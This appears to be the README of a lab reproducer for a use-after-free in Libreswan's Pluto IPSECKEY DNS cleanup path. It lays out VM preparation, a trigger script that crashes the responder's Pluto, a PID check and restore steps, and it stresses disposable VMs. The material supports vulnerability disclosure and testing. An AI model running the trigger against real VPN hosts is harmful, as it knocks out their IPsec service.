# IPSECKEY DNS cleanup use-after-free reproducer

This two-VM laboratory reproducer warms Pluto's private libunbound cache and
then exercises the synchronous cache-hit cleanup path described in the
[public report](../IPSECKEY_DNS_UAF_REPORT.md).

Use disposable VMs only. The preparation scripts replace active IPsec, DNS,
resolver, and firewall configuration and restart services. A vulnerable
responder may crash and be restarted by systemd.

No private key, password, SSH username, or host-specific path is stored in
this directory. The initiator generates a disposable RSA key directly in its
local Libreswan NSS database.

## Requirements

- responder VM: vulnerable Libreswan build with IPSECKEY/libunbound support;
- initiator VM: Libreswan, BIND, and BIND utilities;
- direct IP connectivity between the two VMs;
- SSH/SCP on the host if `copy_to_vms.sh` is used.

The examples below use shell variables rather than fixed lab addresses:

```bash
RESPONDER_IP=192.0.2.10
INITIATOR_IP=192.0.2.20
```

Replace these documentation addresses with the actual isolated VM addresses.

## Copy the files

From the host:

```bash
./copy_to_vms.sh user@RESPONDER user@INITIATOR
```

## Prepare the initiator and authoritative DNS VM

On the initiator, set both addresses in that VM's shell:

```bash
cd /tmp/ipsec-dns-uaf-poc
INITIATOR_IP=192.0.2.20
RESPONDER_IP=192.0.2.10
sudo ./uaf2_prepare_initiator.sh "$INITIATOR_IP" "$RESPONDER_IP"
```

The script generates an RSA host key, derives its IPSECKEY RDATA, renders the
connection and DNS templates, starts authoritative BIND, and restarts the
initiator's Pluto process.

## Prepare the responder

On the responder, set the same addresses in that VM's shell:

```bash
cd /tmp/ipsec-dns-uaf-poc
RESPONDER_IP=192.0.2.10
INITIATOR_IP=192.0.2.20
sudo ./uaf2_prepare_responder.sh "$RESPONDER_IP" "$INITIATOR_IP"
PID_BEFORE=$(pgrep -xo pluto)
```

The script probes both spellings of the historical `dns-match-id` keyword,
points the disposable VM resolver at the initiator DNS service, restarts
Pluto, and enables `allow_dns_insecure` for the unsigned laboratory zone.
Production reachability would instead require valid DNSSEC data.

## Trigger

On the initiator:

```bash
sudo DNS_SERVER=127.0.0.1 ./uaf2_trigger.sh 2
```

The first exchange warms the responder cache. The second exchange receives a
synchronous mismatching A-record result and reaches the stale cleanup path.

Compare the responder PID:

```bash
PID_AFTER=$(pgrep -xo pluto || true)
printf 'before=%s after=%s\n' "$PID_BEFORE" "${PID_AFTER:-stopped}"
```

A changed PID indicates that Pluto terminated and systemd restarted it.

## Restore the VMs

The scripts save backups before replacing configuration.

Responder:

```bash
sudo cp -a /etc/ipsec.conf.uaf2-backup /etc/ipsec.conf
sudo cp -a /etc/resolv.conf.uaf2-backup /etc/resolv.conf
sudo systemctl restart ipsec
```

If `/etc/resolv.conf` was originally a systemd-resolved symlink, restore the
saved link target recorded in `/etc/resolv.conf.uaf2-link` and restart
`systemd-resolved` instead of copying the regular-file backup.

Initiator:

```bash
sudo cp -a /etc/ipsec.conf.uaf2-backup /etc/ipsec.conf
sudo cp -a /etc/named.conf.uaf2-backup /etc/named.conf
sudo systemctl restart ipsec
sudo systemctl disable --now named
```

Review and remove any firewalld rules added by the preparation scripts before
reusing either VM.
